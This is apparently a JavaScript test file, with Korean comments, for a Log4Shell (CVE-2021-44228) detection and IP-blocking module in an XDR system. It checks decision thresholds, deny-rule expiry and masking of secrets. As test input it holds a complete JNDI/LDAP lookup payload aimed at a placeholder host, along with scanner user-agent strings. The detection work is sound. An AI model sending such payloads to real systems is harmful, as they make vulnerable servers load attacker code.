import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import { test } from 'node:test';
import { decide } from '../xdr/known-cve/decide.mjs';
import { readAlerts } from '../xdr/known-cve/read-alerts.mjs';
import { buildDenyRules, checkSource } from '../xdr/known-cve/respond.mjs';

const read = (path) => readFile(new URL(`../${path}`, import.meta.url), 'utf8');
const fixture = JSON.parse(await read('xdr/fixtures/known-cve.json'));
const isNormal = (alert) => !alert.rule.mitre.length;

test('decide.mjs 는 아무것도 불러오지 않고 파일·바깥을 쓰지 않는다', async () => {
  const code = (await read('xdr/known-cve/decide.mjs')).replace(/\/\/.*$/gmu, '');
  assert.doesNotMatch(code, /^\s*import\s|\brequire\s*\(|\bimport\s*\(|\bprocess\.|node:|readFile|writeFile|fetch\(|XMLHttpRequest|Date\.now|Math\.random/mu);
});

test('명확한 공격은 block, 애매한 건 alert, 정상 이벤트는 record 로 나뉜다', async () => {
  const counts = { block: 0, alert: 0, record: 0 };
  for (const alert of fixture.alerts) {
    const out = await decide(alert);
    assert.ok(['block', 'alert', 'record'].includes(out.action));
    assert.ok(out.confidence >= 0 && out.confidence <= 1);
    assert.equal(typeof out.reason, 'string');
    assert.ok(out.reason.length > 0);
    counts[out.action] += 1;
    if (isNormal(alert)) assert.equal(out.action, 'record', `${alert.id} 정상 이벤트`);
    if (/^kc-(09|1[0-6])$/u.test(alert.id)) assert.equal(out.action, 'alert', `${alert.id} 애매한 시도`);
    if (/^kc-0[1-8]$/u.test(alert.id)) assert.equal(out.action, 'block', `${alert.id} 명확한 공격`);
  }
  assert.deepEqual(counts, { block: 8, alert: 8, record: 8 });
});

test('확신도 경계: 0.85 이상 block, 0.5 이상 alert, 그 아래 record', async () => {
  const blocks = [];
  for (const alert of fixture.alerts) {
    const out = await decide(alert);
    if (out.action === 'block') assert.ok(out.confidence >= 0.85, alert.id);
    if (out.action === 'alert') assert.ok(out.confidence >= 0.5 && out.confidence < 0.85, alert.id);
    if (out.action === 'record') assert.ok(out.confidence < 0.5, alert.id);
    blocks.push(out.action);
  }
  assert.equal(blocks.length, 24);
});

test('완성된 원격 조회 구문만 block 이고, 조각·글자·주소 인코딩·반복은 올바르게 다룬다', async () => {
  const make = (data, level = 6, mitre = ['T1190']) => ({ id: 't', timestamp: '2026-09-27T09:00:00+09:00', rule: { level, description: '시험', mitre }, data });
  const full = '${jndi:ldap://203.0.113.9/x}';
  assert.equal((await decide(make({ srcip: '203.0.113.1', useragent: full }))).action, 'block');
  assert.equal((await decide(make({ srcip: '203.0.113.1', url: `/search?q=${encodeURIComponent(full)}` }))).action, 'block');
  assert.equal((await decide(make({ srcip: '203.0.113.1', url: '/search?q=${jndi:' }))).action, 'alert');
  assert.equal((await decide(make({ srcip: '203.0.113.1', url: '/search?q=jndi' }))).action, 'alert');
  assert.equal((await decide(make({ srcip: '203.0.113.1', url: '/search?q=CVE-2021-44228' }))).action, 'alert');
  assert.equal((await decide(make({ srcip: '203.0.113.1', useragent: 'nuclei' }))).action, 'alert');
  assert.equal((await decide(make({ srcip: '203.0.113.1', url: '/' }, 3, []))).action, 'record');
  // 점검 도구 흔적만으로는 막지 않는다. 구문이 완성되어야 막는다.
  assert.notEqual((await decide(make({ srcip: '203.0.113.1', useragent: 'zgrab', url: '/?probe=1' }))).action, 'block');
});

test('이상한 입력도 오류 없이 record 로 답한다', async () => {
  for (const bad of [null, undefined, {}, 5, 'x', [], { data: null }, { data: { url: 7, useragent: {} } }, { rule: { level: 'x', mitre: 'T1190' } }, { data: { url: '%E0%A4%A' } }]) {
    const out = await decide(bad);
    assert.equal(out.action, 'record', JSON.stringify(bad));
    assert.ok(out.confidence >= 0 && out.confidence <= 1);
  }
});

test('패턴 목록: 패턴마다 이름·조건·근거 한 줄이 있고 decide 의 이유에 나오는 이름과 같다', async () => {
  const patterns = JSON.parse(await read('xdr/known-cve/patterns.json'));
  assert.equal(patterns.moduleKey, 'known-cve');
  assert.match(patterns.source, /CVE-2021-44228/u);
  assert.match(patterns.source, /T1190/u);
  const names = patterns.patterns.map((item) => item.name);
  assert.equal(new Set(names).size, names.length);
  for (const item of patterns.patterns) {
    assert.ok(item.name && item.condition && item.basis, item.name);
    assert.doesNotMatch(item.basis, /\n/u);
    assert.match(item.basis, /CVE-2021-44228|T1190/u, `${item.name}: 근거에 출처가 있어야 함`);
  }
  const code = await read('xdr/known-cve/decide.mjs');
  for (const name of names) assert.ok(code.includes(name), `decide.mjs 에 ${name} 이 옮겨져 있어야 함`);
  assert.equal(patterns.minRepeats, 3);
  assert.match(code, /const MIN_REPEATS = 3;/u);
});

test('경보 읽기: 건수와 뽑은 줄이 같고 원본을 고치지 않으며 비밀값처럼 보이는 값은 가린다', async () => {
  const before = await read('xdr/fixtures/known-cve.json');
  const { total, rows } = await readAlerts();
  assert.equal(total, 24);
  assert.equal(rows.length, total);
  assert.equal(await read('xdr/fixtures/known-cve.json'), before);
  for (const row of rows) assert.deepEqual(Object.keys(row), ['timestamp', 'srcip', 'srcuser', 'level', 'description']);
  const { mask } = await import('../xdr/known-cve/read-alerts.mjs');
  assert.equal(mask('password=abc123 Bearer abcdefghijklmnop'), '[가림] [가림]');
});

test('차단 규칙: 막을 후보만 출발 주소별로 만료 시각·근거 경보 번호와 함께 넣고, 정상 사용자 주소는 넣지 않는다', async () => {
  const { extractAlert } = await import('../xdr/known-cve/read-alerts.mjs');
  const entries = [];
  for (const alert of fixture.alerts) entries.push({ alert, row: extractAlert(alert), decision: await decide(alert) });
  const rules = buildDenyRules(entries);
  assert.equal(rules.length, 7);
  for (const rule of rules) {
    assert.equal(rule.decision, 'deny');
    assert.ok(rule.alertIds.length >= 1);
    assert.ok(Date.parse(rule.expiresAt) > 0);
  }
  const normalIps = new Set(entries.filter(({ alert }) => isNormal(alert)).map(({ row }) => row.srcip));
  assert.equal(rules.some((rule) => normalIps.has(rule.srcip)), false);
  const ambiguousIps = new Set(entries.filter(({ decision }) => decision.action === 'alert').map(({ row }) => row.srcip));
  assert.equal(rules.some((rule) => ambiguousIps.has(rule.srcip)), false);

  // 다시 흘리기: 명확한 공격은 규칙에 걸리고, 정상 요청은 판정기 규칙으로 넘어가며, 만료 뒤에는 걸리지 않는다.
  for (const { alert, row, decision } of entries) {
    const hit = checkSource(rules, row.srcip, alert.timestamp);
    if (decision.action === 'block') assert.equal(hit?.decision, 'deny', alert.id);
    else assert.equal(hit, null, alert.id);
  }
  assert.equal(checkSource(rules, '203.0.113.10', '2026-09-28T00:00:00+09:00'), null);
});
